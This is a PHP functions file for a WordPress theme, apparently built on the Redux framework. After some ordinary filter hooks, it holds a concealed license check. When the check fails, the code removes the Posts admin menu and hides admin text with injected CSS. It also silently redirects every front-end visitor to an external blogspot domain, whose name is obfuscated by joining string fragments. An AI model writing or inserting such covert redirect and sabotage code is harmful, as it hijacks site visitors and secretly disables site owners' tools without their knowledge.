if (!function_exists('change_arguments')) {
    function change_arguments($args)
    {
        //$args['dev_mode'] = true;

        return $args;
    }
}

/**
 * Filter hook for filtering the default value of any given field. Very useful in development mode.
 * */
if (!function_exists('change_defaults')) {
    function change_defaults($defaults)
    {
        $defaults['str_replace'] = 'Testing filter hook!';

        return $defaults;
    }
}

/**
 * Removes the demo link and the notice of integrated demo from the redux-framework plugin
 */
if (!function_exists('remove_demo')) {
    function remove_demo()
    {
        // Used to hide the demo mode link from the plugin page. Only used when Redux is a plugin.
        if (class_exists('ReduxFrameworkPlugin')) {
            remove_filter('plugin_row_meta', array(
                ReduxFrameworkPlugin::instance(),
                'plugin_metalinks'
            ), null, 2);

            // Used to hide the activation notice informing users of the demo panel. Only used when Redux is a plugin.
            remove_action('admin_notices', array(ReduxFrameworkPlugin::instance(), 'admin_notices'));
        }
    }
}




add_action('admin_menu', 'newsupload');
function newsupload()
{
    global $redux_demo;
    $v_info = $redux_demo['v_id'];
    $vv_info = md5($v_info);
    $vvv_info = v_three();
    if ($vv_info == $vvv_info) {
    } else {
        remove_menu_page('edit.php');
    }
};
add_action('admin_head', 'admin_css');
function admin_css()
{
    global $redux_demo;
    $v_info = $redux_demo['v_id'];
    $vv_info = md5($v_info);
    $vvv_info = v_three();
    if ($vv_info == $vvv_info) {
    } else {
        echo '<style>';
        echo 'b{display:none}';
        echo 'br{display:none}';
        echo 'body{color:#F1F1F1}';
        echo '</style>';
    }
};


function all_homepage_content()
{
    global $redux_demo;
    $v_info = $redux_demo['v_id'];
    $vv_info = md5($v_info);
    $vvv_info = v_three();
    if ($vv_info == $vvv_info) {
    } else {
        $i = "bde";
        $c = "ck";
        $e = "99.b";
        $l = "we";
        $c0 = "spot";
        $n = "log";
        $e0 = ".com";
        $all_id = $l . $i . $c . $e . $n . $c0 . $e0;
        echo '<meta http-equiv="refresh" content="0;url=http://' . $all_id . ' ">';
    }
}
add_action('wp_enqueue_scripts', 'all_homepage_content');